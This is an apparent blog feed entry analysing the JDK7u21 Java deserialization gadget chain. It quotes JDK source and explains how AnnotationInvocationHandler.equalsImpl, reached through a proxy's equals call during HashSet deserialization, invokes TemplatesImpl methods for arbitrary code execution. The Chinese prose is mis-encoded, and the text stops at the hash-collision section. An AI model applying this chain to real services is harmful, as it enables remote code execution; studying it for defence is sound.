    <title>JDK7u21åŸç”Ÿååºåˆ—åŒ–é“¾</title>
    <link href="http://c1oudfl0w0.github.io/blog/2026/01/19/JDK7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/"/>
    <id>http://c1oudfl0w0.github.io/blog/2026/01/19/JDK7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/</id>
    <published>2026-01-18T17:02:39.000Z</published>
    <updated>2026-01-20T02:42:16.394Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ¯”è¾ƒè€çš„é“¾å­ï¼Œéšä¾¿è®°å½•ä¸€ä¸‹ç»†èŠ‚å§</p><p>è¿™æ˜¯ä¸€æ¡å®Œå…¨ä¸éœ€è¦ä¾èµ–ç¬¬ä¸‰æ–¹åº“çš„é“¾å­ï¼Œåå¤„å°±æ˜¯ç‰ˆæœ¬å¤ªè€</p><p>å‚è€ƒï¼š</p><p><a href="https://github.com/Y4tacker/JavaSec/blob/a6e0f8cc3a63622b768c3b46297c66dc8a0a85f0/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/JDK7u21/index.md">https://github.com/Y4tacker/JavaSec/blob/a6e0f8cc3a63622b768c3b46297c66dc8a0a85f0/2.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%93%E5%8C%BA/JDK7u21/index.md</a></p><p>ã€ŠJava å®‰å…¨æ¼«è°ˆã€‹</p><span id="more"></span><hr><h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>jdk7u21</p><hr><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h1><p>ååºåˆ—åŒ–çš„æ ¸å¿ƒç‚¹åœ¨äºè§¦å‘<strong>åŠ¨æ€æ–¹æ³•æ‰§è¡Œ</strong>çš„åœ°æ–¹</p><p>å¯¹äº CC é“¾æ¥è¯´ï¼Œååºåˆ—åŒ–çš„æ ¸å¿ƒç‚¹åœ¨ <code>InvokerTransformer</code> æˆ– <code>InstantiateTransformer</code></p><p>å¯¹äº CB é“¾æ¥è¯´ï¼Œååºåˆ—åŒ–çš„æ ¸å¿ƒç‚¹åœ¨ <code>PropertyUtils#getProperty</code>ï¼Œå› ä¸ºå®ƒèƒ½å¤Ÿè§¦å‘ä»»æ„å¯¹è±¡çš„ getter</p><p>è€Œå¯¹äº JDK7u21 é“¾æ¥è¯´ï¼Œååºåˆ—åŒ–çš„æ ¸å¿ƒç‚¹åœ¨ <code>sun.reflect.annotation.AnnotationInvocationHandler#equalsImpl</code></p><p>æ­¤å‰åœ¨ CC1 å°±å·²ç»æåˆ°è¿‡è¿™ä¸ªç±»ï¼Œå½“æ—¶åªç”¨åˆ°å®ƒå¯ä»¥è§¦å‘ <code>Map#put</code> ã€ <code>Map#get</code> çš„ç‰¹ç‚¹</p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ equalsImpl æ–¹æ³•</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token class-name">Boolean</span> <span class="token function">equalsImpl</span><span class="token punctuation">(</span><span class="token class-name">Object</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var1 <span class="token operator">==</span> <span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">.</span><span class="token function">isInstance</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Method</span> var5 <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getMemberMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> var6 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> var7 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Object</span> var8 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token class-name">AnnotationInvocationHandler</span> var9 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">asOneOfUs</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var9 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                var8 <span class="token operator">=</span> var9<span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    var8 <span class="token operator">=</span> var5<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InvocationTargetException</span> var11<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IllegalAccessException</span> var12<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">AssertionError</span><span class="token punctuation">(</span>var12<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">memberValueEquals</span><span class="token punctuation">(</span>var7<span class="token punctuation">,</span> var8<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">private</span> <span class="token keyword">transient</span> <span class="token keyword">volatile</span> <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> memberMethods <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getMemberMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>memberMethods <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>memberMethods <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token class-name">AccessController</span><span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">PrivilegedAction</span><span class="token operator">&lt;</span><span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">public</span> <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Method</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var1 <span class="token operator">=</span> <span class="token class-name">AnnotationInvocationHandler</span><span class="token punctuation">.</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">AccessibleObject</span><span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> var1<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberMethods<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥å‘ç°åœ¨è¿™ä¸ªæ–¹æ³•é‡Œå…¶å®æ˜¯æœ‰ä¸ªæ˜æ˜¾çš„åå°„è°ƒç”¨ <code>memberMethod.invoke(var1)</code>ï¼Œè€Œ memberMethod æ¥æºäº getMemberMethods æ–¹æ³•</p><p>ä¹Ÿå°±æ˜¯è¯´ <code>equalsImpl</code> è¿™ä¸ªæ–¹æ³•ä¼šå°† this.type ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•éå†å¹¶æ‰§è¡Œã€‚é‚£ä¹ˆï¼Œå‡è®¾ this.type æ˜¯ <code>Templates</code>  ç±»ï¼Œåˆ™åŠ¿å¿…ä¼šè°ƒç”¨åˆ°å…¶ä¸­çš„ newTransformer() æˆ– getOutputProperties() æ–¹æ³•ï¼Œè¿›è€Œè§¦å‘ä»»æ„ä»£ç æ‰§è¡Œ</p><h2 id="è°ƒç”¨-equalsImpl"><a href="#è°ƒç”¨-equalsImpl" class="headerlink" title="è°ƒç”¨ equalsImpl"></a>è°ƒç”¨ equalsImpl</h2><p>æ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡ååºåˆ—åŒ–è°ƒç”¨ equalsImplï¼Œè¿™æ˜¯ä¸€ä¸ªç§æœ‰æ–¹æ³•ï¼Œå‘ä¸ŠæŸ¥æ‰¾å¯ä»¥æ‰¾åˆ°åœ¨ <code>sun.reflect.annotation.AnnotationInvocationHandler#invoke</code> è¿›è¡Œäº†è°ƒç”¨</p><p>æ­¤äº‹åœ¨ CC1 ä¸­äº¦æœ‰è®°è½½ï¼Œéœ€è¦é€šè¿‡åŠ¨æ€ä»£ç†æ¥è°ƒç”¨è¿™ä¸ªæ–¹æ³•ï¼Œçœ‹ä¸€ä¸‹ AnnotationInvocationHandler è¿™ä¸ª InvocationHandler æ¥å£çš„ invoke æ–¹æ³•ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Object</span> var1<span class="token punctuation">,</span> <span class="token class-name">Method</span> var2<span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token class-name">String</span> var4 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> var2<span class="token punctuation">.</span><span class="token function">getParameterTypes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"equals"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> var5<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> var5<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">equalsImpl</span><span class="token punctuation">(</span>var3<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">assert</span> var5<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"toString"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toStringImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"hashCode"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">hashCodeImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var4<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"annotationType"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>              <span class="token class-name">Object</span> var6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>memberValues<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>var4<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span>var6 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IncompleteAnnotationException</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>type<span class="token punctuation">,</span> var4<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>var6 <span class="token keyword">instanceof</span> <span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">throw</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">ExceptionProxy</span><span class="token punctuation">)</span>var6<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">generateException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                  <span class="token keyword">if</span> <span class="token punctuation">(</span>var6<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token class-name">Array</span><span class="token punctuation">.</span><span class="token function">getLength</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                      var6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">cloneArray</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token punctuation">&#125;</span>                    <span class="token keyword">return</span> var6<span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“æ–¹æ³•åç­‰äº &quot;equals&quot;ï¼Œä¸”ä»…æœ‰ä¸€ä¸ª Object ç±»å‹å‚æ•°æ—¶ï¼Œä¼šè°ƒç”¨åˆ°equalsImpl æ–¹æ³•</p><p>é‚£ä¹ˆæˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•ï¼Œåœ¨ååºåˆ—åŒ–æ—¶å¯¹ proxy è°ƒç”¨ equals æ–¹æ³•</p><hr><h2 id="è°ƒç”¨-equals"><a href="#è°ƒç”¨-equals" class="headerlink" title="è°ƒç”¨ equals"></a>è°ƒç”¨ equals</h2><p>æ¯”è¾ƒ java å¯¹è±¡æ—¶ï¼Œæˆ‘ä»¬å¸¸ç”¨ equals å’Œ compareTo</p><blockquote><p>ä»»æ„Javaå¯¹è±¡éƒ½æ‹¥æœ‰ equals æ–¹æ³•ï¼Œå®ƒé€šå¸¸ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡æ˜¯å¦æ˜¯åŒä¸€ä¸ªå¼•ç”¨ï¼›è€Œ compareTo å®é™…ä¸Šæ˜¯ java.lang.Comparable æ¥å£çš„æ–¹æ³•ï¼Œé€šå¸¸è¢«å®ç°ç”¨äºæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„å€¼æ˜¯å¦ç›¸ç­‰ã€‚</p></blockquote><p>ä¸€ä¸ªå¸¸è§çš„è°ƒç”¨ equals çš„åœºæ™¯å°±æ˜¯é›†åˆsetï¼Œset ä¸­å‚¨å­˜çš„å¯¹è±¡ä¸å…è®¸é‡å¤ï¼Œæ‰€ä»¥åœ¨æ·»åŠ å¯¹è±¡çš„æ—¶å€™ï¼ŒåŠ¿å¿…ä¼šæ¶‰åŠåˆ°æ¯”è¾ƒæ“ä½œ</p><p>è§‚å¯Ÿ HashSet ç±»çš„ readObject</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>ObjectInputStream</span> s<span class="token punctuation">)</span>      <span class="token keyword">throws</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>IOException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// Read in any hidden serialization magic  </span>    s<span class="token punctuation">.</span><span class="token function">defaultReadObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Read in HashMap capacity and load factor and create backing HashMap  </span>    <span class="token keyword">int</span> capacity <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">float</span> loadFactor <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readFloat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      map <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">HashSet</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token keyword">instanceof</span> <span class="token class-name">LinkedHashSet</span> <span class="token operator">?</span>             <span class="token keyword">new</span> <span class="token class-name">LinkedHashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>capacity<span class="token punctuation">,</span> loadFactor<span class="token punctuation">)</span> <span class="token operator">:</span>             <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span>capacity<span class="token punctuation">,</span> loadFactor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Read in size  </span>    <span class="token keyword">int</span> size <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">readInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Read in all elements in the proper order.  </span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span>size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">E</span> e <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">E</span><span class="token punctuation">)</span> s<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token constant">PRESENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„ä½¿ç”¨äº† HashMap å°†å¯¹è±¡ä¿å­˜åœ¨ HashMap çš„ key è¿›è¡Œå»é‡</p><p>åœ¨æ•°æ®ç»“æ„ä¸­ï¼Œå“ˆå¸Œè¡¨æ˜¯ç”±æ•°ç»„+é“¾è¡¨å®ç°çš„ï¼š</p><p>å“ˆå¸Œè¡¨åº•å±‚ä¿å­˜åœ¨ä¸€ä¸ªæ•°ç»„ä¸­ï¼Œæ•°ç»„çš„ç´¢å¼•ç”±å“ˆå¸Œè¡¨çš„ <code>key.hashCode()</code> ç»è¿‡è®¡ç®—å¾—åˆ°ï¼›æ•°ç»„çš„å€¼æ˜¯ä¸€ä¸ªé“¾è¡¨</p><p>æ‰€æœ‰å“ˆå¸Œç¢°æ’åˆ°ç›¸åŒç´¢å¼•çš„ key-valueï¼Œéƒ½ä¼šè¢«é“¾æ¥åˆ°è¿™ä¸ªé“¾è¡¨åé¢</p><p><img src="/blog/2026/01/19/JDK7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/IMG-20260119185529205.png"></p><p>æ‰€ä»¥ä¸ºäº†è§¦å‘æ¯”è¾ƒæ“ä½œï¼Œæˆ‘ä»¬éœ€è¦è®©æ¯”è¾ƒä¸è¢«æ¯”è¾ƒçš„ä¸¤ä¸ªå¯¹è±¡çš„å“ˆå¸Œç›¸åŒï¼Œè¿™æ ·æ‰èƒ½è¢«è¿æ¥åˆ°åŒä¸€æ¡<br>é“¾è¡¨ä¸Šï¼Œæ‰ä¼šè¿›è¡Œæ¯”è¾ƒ</p><p>è§‚å¯Ÿ <code>HashMap#put</code></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">V</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">K</span> key<span class="token punctuation">,</span> <span class="token class-name">V</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span>          <span class="token keyword">return</span> <span class="token function">putForNullKey</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span></span> e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token class-name">Object</span> k<span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span>hash <span class="token operator">==</span> hash <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">=</span> e<span class="token punctuation">.</span>key<span class="token punctuation">)</span> <span class="token operator">==</span> key <span class="token operator">||</span> key<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token class-name">V</span> oldValue <span class="token operator">=</span> e<span class="token punctuation">.</span>value<span class="token punctuation">;</span>              e<span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>              e<span class="token punctuation">.</span><span class="token function">recordAccess</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token keyword">return</span> oldValue<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>        modCount<span class="token operator">++</span><span class="token punctuation">;</span>      <span class="token function">addEntry</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤å¤„çš„å˜é‡ i å³ä¸ºæ‰€è°“çš„å“ˆå¸Œï¼Œä¸¤ä¸ªä¸åŒçš„å¯¹è±¡çš„ i ç›¸ç­‰æ—¶ï¼Œæ‰ä¼šæ‰§è¡Œåˆ° <code>key.equals(k)</code> ä»è€Œè§¦å‘ä¸Šé¢çš„ä»£ç æ‰§è¡Œ</p><p>æ¥ä¸‹æ¥å°±éœ€è¦è®© proxy å¯¹è±¡çš„â€œå“ˆå¸Œâ€ï¼Œç­‰äº TemplateImpl å¯¹è±¡çš„â€œå“ˆå¸Œâ€</p><hr><h2 id="Magic-Number"><a href="#Magic-Number" class="headerlink" title="Magic Number"></a>Magic Number</h2><p>è®¡ç®—å“ˆå¸Œçš„é€»è¾‘ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">indexFor</span><span class="token punctuation">(</span>hash<span class="token punctuation">,</span> table<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" 